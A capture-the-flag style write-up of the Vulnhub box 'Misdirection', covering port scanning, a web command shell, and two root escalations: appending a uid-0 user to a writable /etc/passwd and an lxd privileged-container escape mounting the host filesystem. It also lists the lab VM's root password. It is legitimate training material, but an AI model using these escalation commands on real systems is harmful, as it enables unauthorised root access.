Hello Everyone, This is a write-up for the box Misdirection On Vulnhub. Hope you enjoy.

-----

# Discovery

So First run a ping scan on the network to find the IP Address of the box. In this case for me it's 10.0.2.11

Next i run rustscan and nmap on the box

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

So we have 22,80,3306 and 8080 open. Side Note - Since the box it's call misdirection, i expected it has a lot of rabbit holes.

So i try to connect to the mysql with anonymous but it didnt work. 

Next i visited Port 80 and Run a feroxbuster scan on Port 8080

<br>


## Port 80


![](https://i.imgur.com/Dq7CoYe.png)

<br>


I found a login page, register page and a reset password page.


![](https://i.imgur.com/K7XWxuR.png)



![](https://i.imgur.com/QZ74kkm.png)



![](https://i.imgur.com/wpVDS1Y.png)


So my thoughts was maybe we will find a email address and try to reset the password and login

<br>

The registration page doesn't work so we cant login


![](https://i.imgur.com/KJL0o7K.png)


<br>


## Port 8080

After looking at Port 80 i change my focus to Port 8080 and run a feroxbuster scan on Port 80 

On port 8080 we found that a wordpress is present and some additional directory as well

```bash
301        9l       28w      311c http://10.0.2.11:8080/css
301        9l       28w      313c http://10.0.2.11:8080/debug
301        9l       28w      312c http://10.0.2.11:8080/help
301        9l       28w      314c http://10.0.2.11:8080/images
301        9l       28w      310c http://10.0.2.11:8080/js
301        9l       28w      314c http://10.0.2.11:8080/manual
301        9l       28w      313c http://10.0.2.11:8080/shell
200      353l      862w        0c http://10.0.2.11:8080/debug/index.php
301        9l       28w      317c http://10.0.2.11:8080/wordpress
```

Most of the directory is empty


![](https://i.imgur.com/qGi9Nwu.png)



![](https://i.imgur.com/nZ6xjMF.png)



But on /debug we found a command line interface


![](https://i.imgur.com/fI59QED.png)


So after some enumerating i try to run a reverse shell on the machine using pwncat

```bash
python3 -m pwncat -lp 9999
[14:17:44] Welcome to pwncat 🐈!                                                                      __main__.py:153
[14:19:03] received connection from 10.0.2.11:57444                                                        bind.py:76
[14:19:03] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash                                         manager.py:504
           10.0.2.11:57444: registered new host w/ db                                                  manager.py:504
(local) pwncat$                                                                                                      
(remote) www-data@misdirection:/var/www/html
```


<br>


## Priv-Esc

I use sudo -l and find out that the user brexit can use /bin/bash

```bash
$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

<br>


#### sudo -u 
```bash
(remote) www-data@misdirection:/var/www/html/wordpress$ sudo -u brexit /bin/bash
brexit@misdirection:/var/www/html/wordpress
```

There are 2 ways to Priv-Esc in the box

<br>


### /etc/passwd

We look at /etc/passwd permission

```bash
(remote) brexit@misdirection:/tmp$ ls -al /etc/passwd
-rwxrwxr-- 1 root brexit 1617 Jun  1  2019 /etc/passwd
```

And found that we have write-permission on /etc/passwd so we insert a new user to the file 

So we create a password using openssl

```bash
$  openssl passwd -1 -salt hello 1234   
$1$hello$kz1RTN9pKM0QbUJeB5L8r0
```

And insert this into the passwd file, you can replace `test` with any username you want

```bash
test:$1$hello$kz1RTN9pKM0QbUJeB5L8r0:0:0:root:/root:/bin/bash

(remote) brexit@misdirection:/tmp$ echo 'test:$1$hello$kz1RTN9pKM0QbUJeB5L8r0:0:0:root:/root:/bin/bash' >> /etc/passwd
(remote) brexit@misdirection:/tmp$ su test
Password: 
root@misdirection:/tmp# 
```

With that, we got root.

#openssl


<br>


### lxd

So first clone the [github repo](https://github.com/saghul/lxd-alpine-builder), set it as executable and run it with sudo

```bash
┌──(coolguy㉿CoolGuy)-[~/…/HackProjects/vulnhub/misdirection/lxd-alpine-builder]
└─$ chmod +X build-alpine                               1 ⨯
                                                                                                                      
┌──(coolguy㉿CoolGuy)-[~/…/HackProjects/vulnhub/misdirection/lxd-alpine-builder]
└─$ sudo ./build-alpine
[sudo] password for coolguy: 
Determining the latest release... v3.15
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.7-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
ERROR: checksum is missing for alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
Failed to download a valid static apk
```

After that you should have a image file

Next, upload the file to the victim box. I use pwncat for that

<br>

Next import the image and use any alias you want, after importing run image list to do a sanity check
```bash
(remote) brexit@misdirection:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias test
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
(remote) brexit@misdirection:/tmp$ lxc image list
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| test  | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Dec 16, 2021 at 6:35am (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```


To insure that lxd is running i run `lxd init` and just set everything to default

```bash
(remote) brexit@misdirection:/tmp$ lxd init

Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

(remote) brexit@misdirection:/tmp$ 
```

<br>


Now initialize the image, and check if the image is in the list

```bash
(remote) brexit@misdirection:/tmp$ lxc init test -c security.privileged=true 
Creating the container
Container name is: bright-burro
(remote) brexit@misdirection:/tmp$ lxc list
+--------------+---------+------+------+------------+-----------+
|     NAME     |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+--------------+---------+------+------+------------+-----------+
| bright-burro | STOPPED |      |      | PERSISTENT | 0         |
+--------------+---------+------+------+------------+-----------+
```

Lastly, we need to mount the system and get command execution

```bash
(remote) brexit@misdirection:/tmp$ lxc config device add bright-burro whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to bright-burro
(remote) brexit@misdirection:/tmp$ lxc start bright-burro
(remote) brexit@misdirection:/tmp$ lxc exec bright-burro /bin/sh
~ # id
uid=0(root) gid=0(root)
```

Now we gonna root and so we need to go to `/mnt/root/root` to go to the root directory

```bash
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```

With that we gain root on the box.

#lxd 

Links for reference: 

https://musyokaian.medium.com/anonymous-tryhackme-c15478d23623

https://reboare.github.io/lxd/lxd-escape.html

---

The box has less rabbit hole than i expected, which is good for my mental health and anger management issue XDD. I enjoy the box and hope that the creator will create more box's in the future. Fluffy Signout~~ ʕ•́ᴥ•̀ʔっ

FYI: The box doesn't work out of the box, with VirtualBox, you will need to login in as root to enable the dhcp service or change the adapter for it

`root: De79vXr6*s`
